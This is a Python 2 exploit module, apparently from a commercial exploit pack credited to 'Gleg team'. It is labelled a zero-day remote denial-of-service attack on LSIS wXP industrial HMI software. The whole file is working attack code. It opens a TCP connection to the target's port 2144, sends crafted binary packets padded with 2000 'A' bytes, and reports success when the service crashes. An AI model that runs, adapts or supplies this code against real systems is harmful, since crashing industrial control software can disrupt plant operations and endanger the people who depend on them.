#!/usr/bin/env python

import socket
import struct
import time
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_lsis_wXP_DoS"
INFO['DESCRIPTION'] = "LSIS wXP DoS"
INFO['VENDOR'] = "http://www.lsis.com"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Vulnerability allows remote attacker to crash a wXP.
Tested against wXP V2.01[B018] on Windows 7 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.lsis.com/support/download/"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "27 Feb, 2018. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 2144


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def send(self, data):
        self.sock.send(data)
        res = self.sock.recv(16000)
        print repr(res)
        return res

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Trying to connect to %s:%s' % (self.host, self.port))
        self.sock = socket.socket()
        self.sock.connect((self.host, self.port))
        garb = 'A' * 2000
        data = "\x0a\x05\x00\x00\x20\xf5\x00\x8c\x5a\xf5\x00\x8c\x5a\xf5\x00\x8c\x5a" + \
                struct.pack("<H", len(garb)) + garb
        self.sock.send("\x04\x37\x00\x00\x01")
        data = '\x6b' + struct.pack('<I', len(data)) + data
        self.send(data)
        try:
            self.send("\x03\x00\x00\x00\x00")
            self.send("\x03\x00\x00\x00\x00")
        except Exception as e:
            self.log('[+] wXP successfully crashed')
            self.finish(True)
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()